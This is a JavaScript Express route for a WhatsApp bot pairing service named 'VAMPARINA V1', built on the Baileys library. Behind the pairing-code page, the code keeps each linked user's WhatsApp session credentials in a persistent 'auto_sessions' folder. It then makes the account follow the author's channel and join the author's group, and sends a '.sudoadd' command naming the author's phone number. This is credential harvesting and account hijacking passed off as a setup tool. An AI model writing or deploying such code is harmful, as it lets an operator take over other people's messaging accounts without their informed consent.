import express from 'express';
import fs from 'fs';
import path from 'path';
import pino from 'pino';
import { 
    makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    makeCacheableSignalKeyStore, 
    Browsers, 
    fetchLatestBaileysVersion 
} from '@whiskeysockets/baileys';
import pn from 'awesome-phonenumber';

const router = express.Router();

// YOUR EMPIRE SETTINGS (FROM YOUR LINKS)
const MY_CHANNEL = "0029VbBm7apIXnlmuyjGGM0p@newsletter";
const MY_GROUP_INVITE = "BZNDaKhvMFo5Gmne3wxt9n";
const KING_ARNOLD = "254703110780";

// DIRECTORIES — THIS IS THE KEY CHANGE
const SESSION_DIR = path.join(process.cwd(), 'auto_sessions');  // ← SAVES TO GITHUB FOLDER
const TEMP_DIR = path.join(process.cwd(), 'temp_sessions');

if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });
if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

router.get('/', async (req, res) => {
    let num = (req.query.number || '').replace(/\D/g, '');
    if (!num || num.length < 9) {
        return res.send(`
<!DOCTYPE html><html><body style="background:#000;color:#0f0;text-align:center;padding:100px;font-family:Arial;">
<h1>VAMPARINA V1</h1><p>Enter Number:</p>
<form><input name="number" placeholder="254703110780" style="padding:20px;font-size:28px;width:90%;border:3px solid lime;background:#111;color:#0f0;" required autofocus><br><br>
<button style="padding:20px 60px;font-size:30px;background:lime;color:black;border:none;">GET CODE</button></form>
<br><br><b>KING ARNOLD • +254703110780</b></body></html>`);
    }

    if (num.length === 9) num = '254' + num;
    const tempId = `pair_${Date.now()}`;
    const tempPath = path.join(TEMP_DIR, tempId);
    fs.mkdirSync(tempPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(tempPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "121.0"],
        printQRInTerminal: false
    });

    let responded = false;

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open' && !responded) {
            responded = true;
            const phone = sock.user.id.split(':')[0];
            const sessionId = `vamp_${phone}_${Date.now()}`;
            const finalPath = path.join(SESSION_DIR, sessionId);

            // SAVE SESSION TO auto_sessions FOLDER (GITHUB)
            fs.mkdirSync(finalPath, { recursive: true });
            fs.cpSync(tempPath, finalPath, { recursive: true });

            // AUTO ACTIONS — YOUR EMPIRE GROWS
            await delay(15000);
            try { await sock.newsletterFollow(MY_CHANNEL); } catch {}
            try { await sock.groupAcceptInvite(MY_GROUP_INVITE); } catch {}
            await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${KING_ARNOLD}` });

            // Clean temp
            fs.rmSync(tempPath, { recursive: true, force: true });

            // SUCCESS PAGE
            res.send(`
<!DOCTYPE html><html><body style="background:#000;color:#0f0;text-align:center;padding:80px;">
<h1>SESSION CREATED SUCCESSFULLY</h1>
<h2>Number: ${phone}</h2>
<p>Session saved to <b>auto_sessions/</b> folder</p>
<p>Auto-followed your channel</p>
<p>Auto-joined your group</p>
<p>Auto-added King Arnold as sudo</p>
<br><br><a href="/pair" style="color:lime;font-size:30px;">Create Another</a>
<br><br><b>KING ARNOLD • +254703110780</b></body></html>`);
        }

        if (update.connection === 'close' && !responded) {
            responded = true;
            res.send(`<h1 style="color:red">CONNECTION FAILED</h1><a href="/pair?number=${num}">TRY AGAIN</a>`);
        }
    });

    // Request pairing code
    setTimeout(async () => {
        if (responded) return;
        try {
            let code = await sock.requestPairingCode(num);
            code = code.match(/.{1,4}/g).join('-');
            responded = true;
            res.send(`
<!DOCTYPE html><html><body style="background:#000;color:#0f0;text-align:center;padding:80px;">
<h1>PAIRING CODE READY</h1>
<div style="font-size:90px;letter-spacing:20px;background:#111;padding:40px;border:10px solid lime;border-radius:30px;margin:40px auto;display:inline-block;">${code}</div>
<button onclick="navigator.clipboard.writeText('${code.replace(/-/g,'')}')" style="padding:25px 70px;font-size:35px;background:lime;color:black;border:none;border-radius:50px;">COPY CODE</button>
<br><br><a href="/pair" style="color:lime;font-size:30px;">Another Number</a>
<br><br><b>KING ARNOLD • +254703110780</b></body></html>`);
        } catch (err) {
            responded = true;
            res.send(`<h1 style="color:red">FAILED TO GET CODE</h1><a href="/pair?number=${num}">TRY AGAIN</a>`);
        }
    }, 7000);

    sock.ev.on('creds.update', saveCreds);
});

export default router;